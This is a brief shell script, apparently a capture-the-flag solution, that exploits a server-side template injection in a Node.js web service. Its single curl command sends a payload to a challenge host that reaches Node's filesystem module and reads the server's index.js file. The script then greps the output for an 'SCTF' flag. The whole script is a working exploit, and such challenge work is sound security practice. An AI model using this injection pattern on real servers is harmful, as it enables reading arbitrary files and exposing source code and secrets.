#!/bin/sh
# jest template injection
curl "http://alieni.se:3003/render/root.process.mainModule.require('fs').readFileSync('index.js')" -o ./index.js
cat index.js | grep SCTF | cut -c17-48
